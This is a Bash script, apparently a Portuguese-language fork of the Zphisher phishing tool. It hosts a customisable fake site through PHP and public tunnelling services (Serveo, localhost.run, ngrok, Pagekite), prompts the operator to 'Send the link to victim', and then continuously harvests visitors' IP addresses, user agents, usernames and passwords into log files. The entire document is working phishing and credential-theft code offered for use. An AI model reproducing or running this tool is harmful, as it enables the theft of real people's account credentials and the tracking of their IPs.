trap 'printf "\n";stop;exit 1' 2
deps() {
command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
}
banner() {
clear
printf " \e[33;1m  
 ______		 ______                       _______                  
|      |	|      |       \       /     |       |         \      /
|      |	|      |        \     /      |       |          \    / 
|______|        |______|         \   /       |       |           \  /  
|\              |      |          \ /        |       |            \/   
| \             |      |           |         |       |            /\   
|  \            |      |           |         |       |           /  \  
|   \           |      |           |         |       |          /    \ 
|    \          |      |           |         |_______|         /      \ \e[0m\n"
printf " \e[33;1m      |_|           \e[1;97m    Versão 1.3.2      \e[0m\n"
printf " \n"
printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Ferramenta criada por HeroRicky_Games (https://www.youtube.com/herorickygames)
Baseada na Zphisher \e[0m\n"
printf "

Essa ferramenta é flex, voce muda os arquvios na pasta WebCustomSite
lembre-se que pode haver quedas na rede se compartilhada por muitos 
e faça sua conta no site https://pagekite.net

"
printf " \n"
printf " \e[36;1m.:.Selecione o metodo de entrada para iniciar o serviço.:.\e[0m\n"
printf " \n"
}
menu() {
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Inicie o serviço do site customizavel. "
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Selecione a opção: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
instagram
elif [[ $option == X || $option == x ]]; then
exit 1
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Opção invalida \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

instagram(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Web Custom Site\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Selecione a opção: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="WebCustomSite"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="WebCustomSite"
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e linksender ]]; then
rm -rf linksender
fi
}
start() {
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m LocalHost\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Pagekite.net\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Localhost.run\e[0m\n"
d_o_server="2"
printf "\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Selecione um metodo de entrada externa ou interna: \e[0m\e[1;96m\en' option_server
option_server="${option_server:-${d_o_server}}"
if [[ $option_server == 3 || $option_server == 03 ]]; then
start_s
elif [[ $option_server == 2 || $option_server == 02 ]]; then
start_n
elif [[ $option_server == 4 || $option_server == 04 ]]; then
start_local
elif [[ $option_server == 1 || $option_server == 01 ]]; then
start_l
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Opção invalida \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
start
fi
}
start_s() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
start_serveo
}
start_serveo() {
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > linksender ' &
printf "\n"
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
printf "\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $send_url
printf "\n"
found
}
start_n() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
if [[ -e ngrok ]]; then
echo ""
else
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:80\e[0m\e[1;92m)\e[0m\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
else
wget https://pagekite.net/pk/pagekite.py > /dev/null 2>&1 > /dev/null 2>&1
if [[ -e pagekite.py ]]; then
chmod +x pagekite.py
rm pagekite.py.1
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
fi
fi
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Iniciando pagekite.py, aqui pedirá o seu login no site!\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Então acesse o site https://pagekite.net para fazer sua conta!\e[0m\n"
cd websites/$server && php -S 127.0.0.1:80 > /dev/null 2>&1 &
sleep 2
python3 pagekite.py --signup
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Compartilhe esse link para quem voce quiser:\e[0m\e[1;93m %s \n" $link
found
}
start_local(){
def_port="80"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
printf "\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[0m\n"
printf "\e[1;93m\n"
ssh -R 80:localhost:$port ssh.localhost.run 2>&1
printf "\e[0m\n"
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
while [ true ]; do
if [[ -e "websites/$server/ip.txt" ]]; then
c_ip
rm -rf websites/$server/ip.txt
fi
sleep 0.75
if [[ -e "websites/$server/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Nome da pessoa:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Relato:\e[0m\e[1;96m %s\n\e[0m" $password
cat websites/$server/usernames.txt >> websites/$server/Relato.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Salvo:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
rm -rf websites/$server/usernames.txt
fi
sleep 0.75
done
}
start_l() {
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
printf "\n"
found
}
found() {
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Esperando por acesso das pessoas, aqui estará o log de logins, ips e acessos.,\e[0m\e[1;96m Ctrl + C para sair.\e[0m\n"
printf "\n"
while [ true ]; do
if [[ -e "websites/$server/ip.txt" ]]; then
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Um novo acesso encontrado!\n"
printf "\n"
c_ip
rm -rf websites/$server/ip.txt
rm -rf websites/$server/Encurtador_de_link/ip.txt
fi
sleep 0.75
if [[ -e "websites/$server/usernames.txt" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m !!Relato Encontrado!!\n"
printf "\n"
c_cred
rm -rf websites/$server/usernames.txt
fi
sleep 0.75
done
}
c_ip() {
touch websites/$server/login_info.txt
ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m IP da pessoa quue acessou:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Salvo:\e[0m\e[1;93m websites/%s/IPLOG.txt\e[0m\n" $server
printf "\n"
cat websites/$server/ip.txt >> websites/$server/IPLOG.txt
}
c_cred() {
account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat websites/$server/usernames.txt >> websites/$server/login_info.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Salvo:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Esperando novos Relatos,\e[0m\e[1;96m Ctrl + C pra sair.\e[0m\n"
}
banner
deps
menu
